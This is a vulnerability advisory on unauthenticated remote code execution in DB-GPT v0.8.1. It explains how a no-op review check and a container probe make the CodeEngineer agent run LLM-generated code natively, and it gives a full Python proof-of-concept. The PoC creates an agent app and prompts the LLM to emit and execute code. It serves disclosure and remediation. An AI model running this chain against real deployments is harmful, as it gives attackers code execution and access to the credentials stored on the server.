# DB-GPT CodeAction native subprocess execution of LLM-generated code allows unauthenticated remote code execution (CWE-94, CVSS 9.8)

## Summary

An attacker with network access to a default DB-GPT v0.8.1 deployment executes arbitrary commands on the server with the privileges of the DB-GPT process — no sandbox, no command allowlist, no human confirmation, and no authentication required at any step. The CodeEngineer agent's default CodeAction regex-extracts code blocks from the LLM output and runs every python/bash/shell block through execute_code(); inside the official Docker container, the probe `os.path.exists("/.dockerenv")` makes `if not use_docker or in_docker_container` always true (OR short-circuit), so the code runs natively via subprocess.run even when the Docker SDK is installed — the product's own Docker sandbox path is silently bypassed. The permission review is a no-op, and the default deployment performs no authentication on the service that listens on 0.0.0.0:5670.

## Details

DB-GPT v0.8.1 (eosphoros-ai/DB-GPT) executes LLM-generated code blocks natively in the server process context — no sandbox, no command allowlist, no human confirmation — giving unauthenticated remote code execution. The CodeEngineer agent (CodeAssistantAgent) registers CodeAction as its default action (code_assistant_agent.py:118-121); CodeAction regex-extracts code blocks from the LLM output (code_action.py:40) and runs every python/bash/shell block through execute_code() (code_action.py:59, 98-105). Inside execute_code() (code_utils.py:255-287), os.path.exists('/.dockerenv') makes `if not use_docker or in_docker_container` always true inside the official Docker container (OR short-circuit), so the code is run natively via subprocess.run([sys.executable, <temp script>]) — the product's own Docker sandbox path (code_utils.py:302-341) is silently bypassed even when the Docker SDK is installed. The permission review is a no-op (base_agent.py:791-793, review() unconditionally returns True). The default deployment adds zero authentication: auth.py:25-38 mock authentication always returns role='admin', api_v2.py:43-68 lets requests through when api_keys is empty (the default), and the service listens on 0.0.0.0:5670. An attacker with network access creates a single-agent app using CodeEngineer via an unauthenticated POST /api/v1/app/create, then induces the LLM to emit a code block via an unauthenticated POST /api/v1/chat/completions; the code executes natively in the container (server log "EXECUTING CODE BLOCK 0", no sandbox container created). Dynamically verified 8/8 in the official Docker deployment (2026-08-23).

**Root-cause chain (eight steps):**

1. **Entry point with no security boundary.** code_assistant_agent.py:118-121 — CodeAssistantAgent (CodeEngineer) calls `self._init_actions([CodeAction])` in `__init__`, making CodeAction its default action.
2. **LLM output enters the execution chain.** code_action.py:40 — `extract_code(ai_message)` regex-extracts code blocks from the LLM output.
3. **Unconditional execution.** code_action.py:59, 98-105 — `execute_code_blocks(code_blocks)` calls execute_code() for every python/bash/shell block and prints "EXECUTING CODE BLOCK {i}".
4. **Silent native fallback when Docker is missing.** code_utils.py:217-237 — a failing `import docker` leaves docker=None; when use_docker is None it defaults to True if docker is available, otherwise False with only a logger.warning (secondary scenario).
5. **The container probe short-circuits the sandbox (default-trigger root cause).** code_utils.py:255-257 — `in_docker_container = os.path.exists("/.dockerenv")`; `if not use_docker or in_docker_container` is always true inside a container (OR short-circuit): under the official Docker deployment the native branch is activated unconditionally.
6. **Native subprocess execution.** code_utils.py:257-287 — `cmd = [sys.executable if lang.startswith('python') else _cmd(lang), ...]; subprocess.run(cmd, cwd=work_dir, capture_output=True, text=True)`. The native path executes arbitrary code directly — no sandbox, no allowlist.
7. **No human confirmation.** base_agent.py:791-793 — `async def review(...) -> Tuple[bool, Any]: return True, None` unconditionally approves.
8. **Default zero authentication.** auth.py:25-38 / api_v2.py:43-68 — get_user_from_headers() mock authentication always returns role="admin"; check_api_key() lets requests through when api_keys is empty (the default, :68); the service listens on 0.0.0.0:5670.

```python
# packages/dbgpt-core/src/dbgpt/util/code_utils.py:255-257 -- the container
# probe short-circuits the sandbox: inside the official Docker container
# /.dockerenv always exists, so the OR is always true and the native
# execution branch activates unconditionally
in_docker_container = os.path.exists("/.dockerenv")
if not use_docker or in_docker_container:
    # ... native execution branch (:257-287) ...
    cmd = [sys.executable if lang.startswith('python') else _cmd(lang), ...]
    subprocess.run(cmd, cwd=work_dir, capture_output=True, text=True)

# packages/dbgpt-core/src/dbgpt/agent/core/base_agent.py:791-793 -- the
# permission review unconditionally approves; there is no human confirmation
async def review(...) -> Tuple[bool, Any]:
    return True, None
```

**Affected deployments (default trigger, zero preconditions):**

1. **Official Docker containerized deployment** — `/.dockerenv` always exists inside the container, so the native branch is unconditionally active regardless of whether the Docker SDK is installed; no component needs to be disabled or uninstalled (dynamically verified in-container 8/8 on 2026-08-23, with the Docker SDK 7.1.0 installed).
2. **Bare-metal with the Docker SDK missing or disabled** — use_docker=False falls back to the native path (code_utils.py:227-234); same trigger.

(Non-default) bare-metal with the Docker SDK installed and the daemon running takes the Docker sandbox path (code_utils.py:302-341). The officially recommended deployment form is the default trigger.

**Why this is a vulnerability:**

- The product ships its own sandbox path (code_utils.py:302-341), but the container probe in execute_code() (code_utils.py:255-257) bypasses it by default in the officially documented deployment — a defect in a shipped security control, not an exotic configuration.
- The trigger requires no pre-configuration: the in-container verification ran against the official Docker deployment with the Docker SDK installed (7.1.0), proving the native branch activates with nothing disabled or uninstalled (8/8 assertions passing, 2026-08-23).
- The chain is reachable without credentials and without human involvement: default zero authentication (auth.py:25-38, api_v2.py:43-68) plus a no-op permission review (base_agent.py:791-793). The attacker's only variable is inducing the LLM to emit a code block — the PoC achieves this with a legitimate "save a string to file" task framing.
- Defects of the same shape are tracked upstream: CVE-2025-3248 (Langflow, unauthenticated code-injection RCE, listed in CISA KEV), CVE-2026-33873 (Langflow, agentic assistant executing LLM-generated Python on the server), CVE-2026-73034 (DB-GPT v0.8.1, unauthenticated path-traversal write leading to RCE).

## Proof of Concept

Dynamically verified against DB-GPT v0.8.1 in the official Docker containerized deployment on 2026-08-23: 8/8 automated assertions passing, with the Docker SDK installed in the container (7.1.0) — no component disabled or uninstalled. The script uses only the Python standard library (urllib/subprocess) and no credentials at any step. The marker filename (`/tmp/dbgpt_poc_marker.txt`) is a neutral placeholder — substitute any path of your choice. Save the script as PoC.py on any machine that can reach the DB-GPT port.

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
r"""
PoC - DB-GPT v0.8.1: LLM-generated code executed natively via CodeAction
subprocess in the official Docker deployment - unauthenticated RCE
(default trigger; no need to disable or uninstall the Docker SDK)
======================================================================
CWE-94: Code Injection

Affected product: DB-GPT v0.8.1 (eosphoros-ai/DB-GPT)
Affected deployment: the officially documented Docker containerized
deployment (webserver service in the repository-root docker-compose.yml,
official or self-built image). Inside the Docker container, /.dockerenv
always exists: code_utils.py:256 in_docker_container =
os.path.exists("/.dockerenv") is always True, and :257
`if not use_docker or in_docker_container` is always true by OR
short-circuit -> the native execution branch is unconditionally active,
independent of whether the Docker SDK is installed (the standard
dependency chain dbgpt-app -> dbgpt-sandbox -> docker>=6.0.0 ships the
SDK); nothing needs to be disabled or uninstalled.

Affected components (code path):
    - packages/dbgpt-core/src/dbgpt/agent/core/actions/code_action.py
        CodeAction.run() regex-extracts code blocks from the LLM output
        and executes them (extract_code at :40; execute_code_blocks at
        :59, 98-105)
    - packages/dbgpt-core/src/dbgpt/util/code_utils.py:255-257, 257-287
        execute_code() unconditionally takes the native branch when it
        detects /.dockerenv (running inside a Docker container) and
        executes via subprocess.run([sys.executable, <tmpfile>]) in the
        process context (the vendor-designed Docker sandbox path at
        :302-341 is silently bypassed)
    - packages/dbgpt-core/src/dbgpt/agent/core/code_assistant_agent.py:118-121
        CodeAssistantAgent (CodeEngineer) uses CodeAction as its default
        action

Vulnerability summary:
  In DB-GPT v0.8.1 the agent code-execution chain executes LLM-generated
  code blocks natively by default in the official Docker deployment:
  /.dockerenv always exists inside the container and, once execute_code()
  sees in_docker_container=True, it unconditionally takes the native
  subprocess branch - no sandbox, no command allowlist, no human
  confirmation (review() is a no-op). The attacker needs no credentials
  (default zero authentication, listening on 0.0.0.0:5670, docker-compose
  maps 5670:5670 by default) and only has to induce the LLM, in natural
  language, to emit an executable Python code block in order to run
  arbitrary commands inside the DB-GPT server container - reading the
  LLM API key from container environment variables, mounted volumes and
  internal databases.

Trigger conditions (default deployment, zero pre-configuration):
  1. The server is network-reachable (default 0.0.0.0:5670, zero
     authentication, compose maps port 5670 by default)
  2. DB-GPT is deployed as a Docker container (/.dockerenv exists ->
     native branch active by default; independent of the Docker SDK
     being installed or not)
  3. The LLM is induced to emit an executable code block (this PoC uses
     a legitimate "save a string to file" task framing)

Impact:
  Arbitrary command execution inside the DB-GPT server container (the
  application container is the server itself, holding the LLM API key,
  database credentials, mounted volumes and internal-network access) -
  unauthenticated remote code execution.

Verification logic (full chain through the real service API, no
authentication at any step):
  [Precheck]  Confirm the service is reachable; in container mode
              (--container) confirm /.dockerenv exists inside the
              container, the Docker SDK is installed, and the dbgpt
              version is 0.8.1 (proving the default deployment triggers
              without disabling/uninstalling anything)
  [Step 1]    Create a single-agent app using CodeEngineer (CodeAction)
              without authentication
  [Step 2]    Chat with the app without authentication, inducing the LLM
              to generate a Python code block that writes a marker file
  [Step 3]    Verify the marker file was created inside the container
              with content POC_EXECUTED (RCE artifact)
  [Step 4]    Cleanup: remove the app and the marker file

Test environment:
  - DB-GPT v0.8.1 (Docker containerized deployment, service at
    http://localhost:5670)
  - Python 3.10+ (urllib/subprocess standard library, no extra
    dependencies)

Usage:
  python PoC.py --target http://localhost:5670 --container dbgpt-webserver
  (--container names the Docker container running DB-GPT, for
   in-container marker verification; without it the script falls back to
   a marker file in the local temp directory, for non-containerized
   deployments)
"""

import json
import os
import subprocess
import sys
import tempfile
import time
import urllib.error
import urllib.request
import uuid

TARGET = "http://localhost:5670"
CONTAINER = ""  # name of the Docker container running DB-GPT (in-container verification mode)

args = sys.argv[1:]
i = 0
while i < len(args):
    if args[i] == "--target" and i + 1 < len(args):
        TARGET = args[i + 1]
        i += 2
    elif args[i] == "--container" and i + 1 < len(args):
        CONTAINER = args[i + 1]
        i += 2
    else:
        i += 1

PASSED = 0
FAILED = 0

# Marker file: /tmp inside the DB-GPT container in container mode, the local
# temp directory otherwise. Neutral placeholder name - substitute any path.
MARKER = "/tmp/dbgpt_poc_marker.txt" if CONTAINER else os.path.join(
    tempfile.gettempdir(), "dbgpt_poc_marker.txt"
).replace("\\", "/")

# Two prompts that induce the LLM to emit a code block (the second is a
# fallback for LLM wording drift)
PROMPTS = [
    "Please use Python to save the string 'POC_EXECUTED' to a text file at path "
    f"{MARKER}. Output the python code block, then run it.",
    "Please write a Python script to save 'POC_EXECUTED' into the text file at "
    f"{MARKER}, then execute it. Output the python code block.",
]


def check(name: str, condition: bool, detail: str = "") -> None:
    """Record one step result; print [PASS] or [FAIL]."""
    global PASSED, FAILED
    if condition:
        PASSED += 1
        print(f"  \033[92m[PASS]\033[0m {name}  {detail}")
    else:
        FAILED += 1
        print(f"  \033[91m[FAIL]\033[0m {name}  {detail}")


def api(method: str, path: str, body=None, timeout: int = 30):
    """Send an HTTP request; return (status_code, response_text)."""
    data = json.dumps(body).encode("utf-8") if body is not None else None
    h = {"Content-Type": "application/json"}
    req = urllib.request.Request(TARGET + path, data=data, headers=h, method=method)
    try:
        resp = urllib.request.urlopen(req, timeout=timeout)
        return resp.status, resp.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")
    except Exception as e:
        return 0, f"{{'error': {str(e)!r}}}"


def docker_exec(*cmd: str) -> subprocess.CompletedProcess:
    """Run a command inside the DB-GPT container; return CompletedProcess."""
    try:
        return subprocess.run(
            ["docker", "exec", CONTAINER, *cmd],
            capture_output=True, encoding="utf-8", errors="replace", timeout=60,
        )
    except FileNotFoundError:
        # docker CLI not on PATH
        return subprocess.CompletedProcess([], 127, b"", "docker CLI not found")
    except Exception as e:  # noqa: BLE001
        return subprocess.CompletedProcess([], 127, b"", str(e))


def docker_cli_available() -> bool:
    """Check whether the docker CLI is callable."""
    try:
        r = subprocess.run(["docker", "version", "--format", "{{.Server.Version}}"],
                           capture_output=True, encoding="utf-8", errors="replace",
                           timeout=30)
        return r.returncode == 0
    except Exception:  # noqa: BLE001
        return False


def marker_exists() -> bool:
    """Check whether the marker file exists (docker exec in container mode, direct check otherwise)."""
    if CONTAINER:
        r = docker_exec("ls", MARKER)
        return r.returncode == 0
    return os.path.exists(MARKER)


def marker_content() -> str:
    """Read the marker file content (docker exec in container mode, direct read otherwise)."""
    if CONTAINER:
        r = docker_exec("cat", MARKER)
        return r.stdout.strip() if r.returncode == 0 else ""
    try:
        with open(MARKER, encoding="utf-8", errors="replace") as f:
            return f.read().strip()
    except Exception:
        return ""


def remove_marker() -> None:
    """Delete the marker file (keeps each judgment independent)."""
    if CONTAINER:
        docker_exec("rm", "-f", MARKER)
    elif os.path.exists(MARKER):
        os.remove(MARKER)


def create_code_app(app_code: str) -> tuple:
    """Create a single-agent app using CodeEngineer (CodeAction) without authentication."""
    gpts_app = {
        "app_code": app_code,
        "app_name": "PoC Code Agent",
        "app_describe": "code execution verification",
        "team_mode": "single_agent",
        "language": "en",
        "published": "true",
        "details": [
            {
                "agent_name": "CodeEngineer",
                "llm_strategy": "priority",
                "llm_strategy_value": None,
                "resources": [],
                "prompt_template": None,
            }
        ],
    }
    return api("POST", "/api/v1/app/create", gpts_app)


def remove_app(app_code: str) -> tuple:
    """Remove the app without authentication."""
    return api("POST", "/api/v1/app/remove", {"app_code": app_code, "user_code": "001"})


def chat_trigger(app_code: str, prompt: str) -> int:
    """Chat with the CodeEngineer app without authentication, inducing the
    LLM to generate and execute a code block.

    Returns the HTTP status code. The code executes inside the server-side
    agent loop (SSE streamed response).
    """
    body = {
        "chat_mode": "chat_agent",
        "app_code": app_code,
        "model_name": "deepseek-v4-pro",
        "temperature": 0,
        "user_input": prompt,
    }
    data = json.dumps(body).encode("utf-8")
    h = {"Content-Type": "application/json"}
    req = urllib.request.Request(
        TARGET + "/api/v1/chat/completions", data=data, headers=h, method="POST"
    )
    try:
        resp = urllib.request.urlopen(req, timeout=180)
        resp.read()  # consume the full SSE stream until the agent turn ends
        return resp.status
    except urllib.error.HTTPError as e:
        return e.code
    except Exception as e:
        return 0


def main() -> bool:
    global PASSED, FAILED
    print()
    print("\033[1;36m" + "=" * 62 + "\033[0m")
    print("\033[1;36m  DB-GPT v0.8.1")
    print("  Native execution of LLM-generated code in the official Docker")
    print("  deployment - PoC\033[0m")
    print(f"\033[1;36m  Target: {TARGET}\033[0m")
    if CONTAINER:
        print(f"\033[1;36m  Verification mode: in-container marker (docker exec {CONTAINER})\033[0m")
    print("\033[1;36m" + "=" * 62 + "\033[0m")
    print()

    # -- Precheck --
    print("\033[1;33m[Precheck] Service reachable + deployment environment state (default deployment, nothing disabled)\033[0m")
    code, body = api("GET", "/api/controller/models")
    check("DB-GPT service reachable", code == 200, f"HTTP {code}")
    if code != 200:
        print("  Please start DB-GPT v0.8.1 in its Docker containerized form first")
        return False

    precheck_ok = True
    if CONTAINER:
        if not docker_cli_available():
            check("docker CLI available", False, "docker CLI not on PATH; cannot verify inside the container")
            return False
        # /.dockerenv exists -> code_utils.py:256 in_docker_container=True
        r = docker_exec("ls", "-la", "/.dockerenv")
        ok1 = r.returncode == 0
        check("Container /.dockerenv exists (native-branch condition in_docker_container=True)",
              ok1, "code_utils.py:256 always True (inherent to Docker containers)" if ok1 else r.stderr.strip()[:80])
        # Docker SDK installed -> use_docker=True (not uninstalled; proves the
        # default deployment needs no component disabled)
        r = docker_exec("python", "-c", "import docker; print(docker.__version__)")
        ok2 = r.returncode == 0
        check("Docker SDK installed in container (use_docker=True, not uninstalled/disabled)",
              ok2, f"docker SDK version: {r.stdout.strip()}" if ok2 else r.stderr.strip()[:80])
        # dbgpt version
        r = docker_exec("python", "-c", "import dbgpt; print(dbgpt.__version__)")
        ok3 = r.stdout.strip().startswith("0.8.1")
        check("DB-GPT version in container is 0.8.1", ok3, f"version: {r.stdout.strip() or 'read failed'}")
        if not (ok1 and ok2 and ok3):
            precheck_ok = False
            print("  \033[1;33mContainer precheck not fully passed; check the --container name and the deployment environment\033[0m")
            print("  \033[1;33m(attack steps are skipped when in-container verification is unavailable)\033[0m")
            return False
        # Both conditions hold -> native branch (printed only after the precheck passes)
        print("  \033[1;36m-> Both conditions hold: execute_code() enters the native subprocess branch\033[0m")
        print("  \033[1;36m   (code_utils.py:257 'not use_docker or in_docker_container')\033[0m")
        print("  \033[1;36m   Triggered even with the Docker SDK installed (use_docker=True); nothing disabled or uninstalled\033[0m")
    print()

    # -- Step 1: create the CodeEngineer app without authentication --
    print("\033[1;33m[Step 1] Create a CodeEngineer single-agent app without authentication\033[0m")
    app_code = "poc-code-" + uuid.uuid4().hex[:8]
    code, body = create_code_app(app_code)
    ok = code == 200 and '"success":true' in body
    check("App created", ok, f"HTTP {code}  app_code={app_code}")
    if not ok:
        print("  App creation failed; cannot continue the attack chain")
        return False
    print()

    # -- Step 2: unauthenticated chat triggers code execution --
    print("\033[1;33m[Step 2] Unauthenticated chat induces the LLM to emit a code block (native execution in the container)\033[0m")
    remove_marker()  # remove any leftover marker so the judgment stays independent
    trigger_ok = False
    attempt = 0
    for i, prompt in enumerate(PROMPTS, start=1):
        attempt = i
        print(f"  Attempt {i}: sending unauthenticated chat_agent request ...")
        chat_status = chat_trigger(app_code, prompt)
        print(f"    chat_completions HTTP {chat_status}, waiting for agent code execution ...")
        # the agent loop takes time; wait for the code execution to land
        for _ in range(20):
            time.sleep(1)
            if marker_exists():
                trigger_ok = True
                break
        if trigger_ok:
            break
    check("LLM code block executed in the container (marker file POC_EXECUTED)",
          trigger_ok, f"attempt {attempt}  marker={MARKER}")
    print()

    # -- Step 3: verify the RCE artifact --
    print("\033[1;33m[Step 3] Verify the marker file content inside the container\033[0m")
    content = marker_content()
    check("Marker content correct", content == "POC_EXECUTED", f"content: {content!r}")
    if CONTAINER:
        r = docker_exec("cat", "/etc/hostname")
        print(f"  \033[1;36mMarker file is inside container {CONTAINER} (hostname: {r.stdout.strip()})\033[0m")
    print()

    # -- Step 4: cleanup --
    print("\033[1;33m[Step 4] Cleanup (remove the app and the marker file)\033[0m")
    code, body = remove_app(app_code)
    check("Test app removed", code == 200 and '"success":true' in body, f"HTTP {code}")
    remove_marker()
    if not marker_exists():
        print("  Marker file removed")
    print()

    # -- Summary --
    total = PASSED + FAILED
    print("\033[1;36m" + "=" * 62 + "\033[0m")
    print(f"\033[1;36m  Result: {PASSED}/{total} passed\033[0m")
    if FAILED == 0:
        print("\033[1;36m  Verdict: \033[91mVULNERABLE\033[0m")
        print("\033[1;36m  Native execution of LLM-generated code under the official Docker")
        print("  deployment (unauthenticated RCE) confirmed\033[0m")
    else:
        print("\033[1;33m  Verdict: partially failed; check the service state\033[0m")
    print("\033[1;36m" + "=" * 62 + "\033[0m")
    print()
    print("Root cause:")
    print("  code_action.py          - CodeAction.run() regex-extracts LLM code blocks")
    print("  code_utils.py:256       - in_docker_container = /.dockerenv exists (always True in a container)")
    print("  code_utils.py:257-287   - native subprocess.run([sys.executable, tmpfile]) branch")
    print("  code_assistant_agent.py - CodeEngineer uses CodeAction as its default action")
    print("  -> Docker deployment defaults to native execution + no authentication + no review confirmation -> CWE-94 arbitrary code execution")
    print()

    return FAILED == 0


if __name__ == "__main__":
    success = main()
    sys.exit(0 if success else 1)
```

Run:

```bash
python PoC.py --target http://localhost:5670 --container dbgpt-webserver
```

`--container` names the Docker container running DB-GPT so the script can verify the marker file inside it via `docker exec`; without it, the script falls back to verifying a marker file in the local temp directory (for non-containerized deployments).

What the script does — no authentication anywhere:

- [Precheck] service reachable via GET /api/controller/models; in container mode: `/.dockerenv` exists (→ in_docker_container=True, code_utils.py:256), the Docker SDK is installed, and the dbgpt version is 0.8.1.
- [Step 1] unauthenticated POST /api/v1/app/create creates a single-agent app using CodeEngineer.
- [Step 2] unauthenticated POST /api/v1/chat/completions (chat_mode=chat_agent) induces the LLM to emit a Python code block that writes "POC_EXECUTED" to the marker path (a second backup prompt handles LLM wording drift).
- [Step 3] verifies the marker file exists inside the container with content POC_EXECUTED.
- [Step 4] removes the app and the marker.

Expected result: all checks print `[PASS]`; the server log shows "EXECUTING CODE BLOCK 0" while no sandbox container is created; `docker exec dbgpt-webserver cat /tmp/dbgpt_poc_marker.txt` returns `POC_EXECUTED`.

## Impact

- **Type:** Code injection (CWE-94). Because the chain is reachable without authentication, missing authorization (CWE-862) is a contributing weakness.
- **Who is impacted:** any DB-GPT v0.8.1 deployment in the officially documented Docker containerized form (the default) or on bare metal without the Docker SDK — reachable by any network client of port 5670 (docker-compose maps 5670:5670 by default).
- **Attacker capabilities (default deployment, no authentication, verified):** create a single-agent app using CodeEngineer via an unauthenticated POST /api/v1/app/create; induce the LLM to emit a Python code block via an unauthenticated POST /api/v1/chat/completions; the code executes natively in the container with the privileges of the DB-GPT server process. The application container is the server itself: the attacker can read container environment variables including the LLM API key, access mounted volumes and internal databases, and move laterally.
- **CVSS:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` = 9.8 (Critical).
  - AV:N — the service listens on 0.0.0.0:5670 and is network-reachable by default.
  - AC:L — the official Docker deployment triggers by default; no component needs to be disabled or uninstalled.
  - PR:N — default zero authentication (mock auth returns admin; empty api_keys lets requests through).
  - UI:N — review() unconditionally approves; no human involvement at any step.
  - S:U — the code executes within the DB-GPT server process's own privilege context (the native path bypasses only the optional Docker sandbox).
  - C:H / I:H / A:H — arbitrary read of files, secrets and environment variables; arbitrary write/execute; process control.
  - Score per the official FIRST CVSS v3.1 formula: Impact = 6.42 × 0.9148 = 5.873, Exploitability = 3.887, round-up(5.873 + 3.887) = 9.8.

**Scope note (alternate scoring).** Using S:C would mathematically yield 10.0, but that is rejected by the CVSS v3.1 formula: the code executes in the server process's own context — the native path bypasses only the optional Docker sandbox. S:U = 9.8 is authoritative.

## Affected products

| Field | Value |
|------|------|
| **Vendor** | `eosphoros-ai` (https://github.com/eosphoros-ai/DB-GPT) |
| **Product** | `DB-GPT` |
| **Affected versions** | `0.8.1` |
| **Deployment** | Official Docker containerized deployment (repository-root docker-compose.yml maps 5670:5670; official image `eosphorosai/dbgpt-openai`) — default trigger; bare-metal without the Docker SDK also affected |
| **Patched versions** | `None` (no official fix released as of the submission date) |

## Severity

| Field | Value |
|------|------|
| **Severity** | `Critical` |
| **Vector string** | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| **Score** | `9.8` |

## Remediation

**Temporary mitigations (from the submitted report):**

1. **Network layer:** restrict port 5670 to internal/trusted networks only; do not expose it directly to the public internet (firewall/security group).
2. **Deployment layer:** upgrade to an official fixed version once released; until then, avoid using CodeEngineer/CodeAction agent applications. Note: under Docker container deployment, "ensure the Docker SDK is installed so the sandbox path is used" is NOT an effective mitigation — the /.dockerenv short-circuit keeps the native branch always active.
3. **Monitoring:** alert on subprocess creation, tmp_code_* script execution, and "EXECUTING CODE BLOCK" log lines; monitor abnormal file writes inside the container.
4. **Minimization:** do not expose model/agent services to the public network in production; where necessary, front them with a reverse proxy plus authentication.

**Formal fix:** at the time of submission, no official patch had been released by the vendor.

## Timeline

| Date | Event |
|------|-------|
| 2026-10-14 | Reported to vendor (GitHub issue [#3287](https://github.com/eosphoros-ai/DB-GPT/issues/3287)) |
| 2026-10-14 | This advisory published |

## Weaknesses

| # | CWE | Name | Rationale |
|:--:|------|------|------|
| 1 (primary) | CWE-94 | Improper Control of Generation of Code ('Code Injection') | LLM-generated code blocks are regex-extracted (code_action.py:40) and executed natively via subprocess.run (code_utils.py:257-287) with no sandbox, no command allowlist, and no human confirmation (base_agent.py:791-793) |
| 2 | CWE-862 | Missing Authorization | Default zero authentication: auth.py:25-38 mock authentication always returns role="admin"; api_v2.py:43-68 lets requests through when api_keys is empty (the default); service listens on 0.0.0.0:5670 |
